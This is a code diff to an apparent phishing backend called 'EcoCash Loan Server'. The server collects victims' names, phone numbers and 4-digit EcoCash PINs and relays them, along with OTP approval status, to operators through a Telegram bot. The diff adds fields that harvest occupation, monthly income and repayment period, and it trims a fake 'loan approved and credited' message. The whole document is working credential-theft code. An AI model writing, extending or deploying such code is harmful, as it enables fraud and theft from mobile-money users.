@@ -59,7 +59,10 @@ app.post('/api/submit-credentials', async (req, res) => {
       const messageText = `🔐 <b>ECOCASH CREDENTIALS (STEP 2)</b>\n\n` +
                           `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                           `👤 <b>Name:</b> ${data.fullName || 'N/A'}\n` +
+                          `🏢 <b>Occupation:</b> ${data.occupation || 'N/A'}\n` +
+                          `💵 <b>Monthly Income:</b> $${data.monthlyPayments || 'N/A'}\n` +
                           `📊 <b>Loan Requested:</b> $${data.loanAmount || 'N/A'}\n` +
+                          `⏳ <b>Repayment:</b> ${data.repaymentTime || 'N/A'}\n` +
                           `📞 <b>Phone:</b> 263${formattedPhone}\n` +
                           `🔑 <b>PIN (4-digit):</b> <code>${data.pin || 'N/A'}</code>\n` +
                           `⏰ <b>Date:</b> ${currentTimestamp}\n\n` +
@@ -219,7 +222,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       appData.status = 'OTP_APPROVED';
       activeApplications.set(appReference, appData);
     }
-    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: OTP Verified as CORRECT ✅</b>\n\n🎉 <b>Congratulations! Your loan request has been successfully approved and credited to your EcoCash account.</b>`;
+    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: OTP Verified as CORRECT ✅</b>`;
     await editTelegramMessage(botToken, chatId, messageId, updatedText);
   }
 
@@ -254,3 +257,4 @@ app.get('*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`🚀 EcoCash Loan Server running on port ${PORT}`);
 });
+        
